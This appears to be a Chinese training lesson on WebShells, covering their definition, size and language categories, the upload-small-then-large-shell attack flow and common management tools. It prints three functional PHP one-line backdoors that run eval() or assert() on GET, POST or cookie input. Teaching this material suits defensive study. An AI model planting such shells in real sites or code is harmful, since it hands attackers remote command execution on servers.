# 🛡️ 网络安全就业推荐 - P16：第14天：WebShell基础及文件上传漏洞准备

在本节课中，我们将要学习WebShell的基本概念、工作原理、常见类型以及管理工具。这是理解后续文件上传漏洞课程的重要基础。

## 什么是WebShell？🤔

![](img/3ec91e75fff5698df2b49f305d72fcaa_1.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_3.png)

WebShell是一种以ASP、PHP、JSP等网页文件形式存在的命令执行环境。这些网页文件是动态脚本文件，可以被称为网页木马后门。攻击者通过此类网页后门获取网站服务器的权限，从而控制服务器进行文件上传下载、查看数据库以及执行命令。

![](img/3ec91e75fff5698df2b49f305d72fcaa_5.png)

上一节我们介绍了WebShell的基本定义，本节中我们来看看与之相关的“木马”和“后门”概念。

![](img/3ec91e75fff5698df2b49f305d72fcaa_7.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_9.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_10.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_11.png)

**木马**，全称特洛伊木马，指隐藏在计算机中用于非授权远程控制的程序。其作用是开放系统权限、泄露用户信息给攻击者，是黑客常用工具，能在管理员未察觉的情况下获取系统权限。

![](img/3ec91e75fff5698df2b49f305d72fcaa_12.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_13.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_15.png)

**后门**，指攻击者利用服务（如Web服务的80端口、远程桌面的3389端口、SSH的22端口）获取服务器权限后，为自己留下的隐蔽入口。

![](img/3ec91e75fff5698df2b49f305d72fcaa_17.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_19.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_21.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_22.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_24.png)

## WebShell的分类 📂

![](img/3ec91e75fff5698df2b49f305d72fcaa_26.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_28.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_29.png)

了解了基本概念后，我们来看看WebShell有哪些常见的分类方式。

![](img/3ec91e75fff5698df2b49f305d72fcaa_31.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_33.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_35.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_36.png)

根据文件大小，WebShell可分为以下三类：
*   **一句话木马**：代码极短，通常只有一行，使用方便。
*   **小马**：体积较小，通常包含文件上传等基础功能。
*   **大马**：体积较大，功能丰富，代码常进行加密以绕过检测。

![](img/3ec91e75fff5698df2b49f305d72fcaa_38.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_40.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_41.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_43.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_45.png)

根据脚本类型，WebShell可分为：
*   ASP
*   JSP
*   ASPX
*   PHP
*   等动态网页脚本文件。目前PHP语言开发的网站较为常见。

![](img/3ec91e75fff5698df2b49f305d72fcaa_47.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_49.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_51.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_53.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_55.png)

## WebShell的特点与攻击流程 ⚙️

![](img/3ec91e75fff5698df2b49f305d72fcaa_57.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_59.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_61.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_63.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_65.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_67.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_69.png)

WebShell通常具有以下四个特点：
1.  以动态脚本语言形式出现。
2.  本质上是一个木马后门，能获取服务器权限并执行命令。
3.  通常通过80端口（Web服务端口）传递数据，可以穿越防火墙。
4.  一般不在系统日志中留下记录，只会在Web日志中留下数据传递记录。

![](img/3ec91e75fff5698df2b49f305d72fcaa_71.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_73.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_75.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_77.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_79.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_81.png)

那么，攻击者是如何利用WebShell进行攻击的呢？以下是基本的攻击流程：
1.  **获取Web权限**：利用SQL注入、文件上传等Web漏洞获取执行命令或上传文件的权限。
2.  **上传小马**：利用获取的权限上传一个功能简单的小马。小马的主要作用是上传大马。
3.  **上传大马**：通过小马的文件上传功能，将功能强大的大马上传到服务器。
4.  **远程执行命令**：通过大马执行命令，获取服务器信息，完成攻击。

![](img/3ec91e75fff5698df2b49f305d72fcaa_83.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_85.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_87.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_89.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_91.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_93.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_95.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_97.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_99.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_101.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_102.png)

## 常见WebShell示例（以PHP为例）💻

![](img/3ec91e75fff5698df2b49f305d72fcaa_104.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_106.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_108.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_109.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_111.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_113.png)

上一节我们介绍了WebShell的攻击流程，本节中我们来看看具体的代码示例。我们将以PHP语言为例，展示几种常见的一句话木马形式。

![](img/3ec91e75fff5698df2b49f305d72fcaa_115.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_117.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_119.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_121.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_123.png)

**1. GET方式传递参数**
```php
<?php @eval($_GET['pass']);?>
```
*   `eval()`函数将字符串作为PHP代码执行。
*   `$_GET['pass']`通过URL的GET参数（如`?pass=命令`）接收要执行的命令字符串。

![](img/3ec91e75fff5698df2b49f305d72fcaa_125.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_127.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_129.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_131.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_133.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_135.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_137.png)

**2. POST方式传递参数**
```php
<?php @eval($_POST['pass']);?>
```
*   原理与GET方式类似，但命令字符串通过HTTP请求体中的POST参数传递。

![](img/3ec91e75fff5698df2b49f305d72fcaa_139.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_141.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_143.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_145.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_147.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_149.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_151.png)

**3. COOKIE方式传递参数**
```php
<?php @assert($_COOKIE['cmd']);?>
```
*   `assert()`函数检查表达式，若为字符串则将其作为PHP代码执行。
*   `$_COOKIE['cmd']`从HTTP请求头的Cookie字段中获取要执行的命令字符串。

![](img/3ec91e75fff5698df2b49f305d72fcaa_153.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_155.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_157.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_158.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_160.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_162.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_164.png)

## WebShell管理工具 🛠️

![](img/3ec91e75fff5698df2b49f305d72fcaa_166.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_168.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_170.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_172.png)

手动通过浏览器传递命令效率较低，因此诞生了专门的WebShell管理工具。以下是几种常见工具：

![](img/3ec91e75fff5698df2b49f305d72fcaa_174.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_176.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_178.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_180.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_182.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_183.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_185.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_187.png)

*   **中国菜刀**：经典的WebShell管理工具，但目前已较为过时。
*   **C刀 (Cknife)**：界面简洁，功能实用，基于Java开发。
*   **Weevely**：Kali Linux中自带的命令行WebShell管理工具，可用于生成木马和连接。
*   **中国蚁剑**：功能丰富的WebShell管理客户端。
*   **冰蝎 (Behinder)**：新一代WebShell管理工具，通信过程全程加密，能有效绕过防火墙和WAF检测。

![](img/3ec91e75fff5698df2b49f305d72fcaa_189.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_191.png)

这些工具的核心功能都是连接我们上传的一句话木马，提供图形化或命令行界面来方便地执行命令、管理文件、操作数据库等。

![](img/3ec91e75fff5698df2b49f305d72fcaa_193.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_194.png)

## 总结 📝

![](img/3ec91e75fff5698df2b49f305d72fcaa_196.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_198.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_200.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_202.png)

![](img/3ec91e75fff5698df2b49f305d72fcaa_203.png)

本节课中我们一起学习了WebShell的基础知识。我们了解了WebShell是一种网页后门，攻击者通过它控制服务器。我们学习了WebShell根据大小和脚本类型的分类，掌握了其通过80端口通信的特点和“利用漏洞->上传小马->上传大马->执行命令”的基本攻击流程。最后，我们通过PHP代码示例直观地认识了几种一句话木马，并了解了几款常用的WebShell管理工具。理解这些内容是学习明天文件上传漏洞课程的重要前提。